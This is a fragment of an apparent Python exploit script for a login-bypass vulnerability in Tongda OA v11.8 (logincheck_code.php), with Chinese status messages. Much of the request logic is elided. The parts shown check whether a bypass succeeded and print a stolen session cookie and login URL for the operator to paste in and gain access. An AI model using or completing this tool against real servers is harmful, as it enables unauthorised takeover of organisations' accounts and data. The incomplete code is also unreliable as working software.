...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测通达OA v11.8 logincheck_code.php登陆绕过漏洞")
    headers = {
        ...
        if len(tmp_cookie) > 10:
            ...
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    print(now_time() + " [SUCCESS]  获取到setcookie,请粘贴: {}".format(tmp_cookie))
                    print(now_time() + ' [SUCCESS]  登录路径为:{}'.format(login_url))
            else:
                print(now_time() + " [WARNING]  通达OA登录绕过漏洞不存在")
    except:
        print(now_time() + " [ERROR]    无法获取目标cookie，可能目标不存在 ")
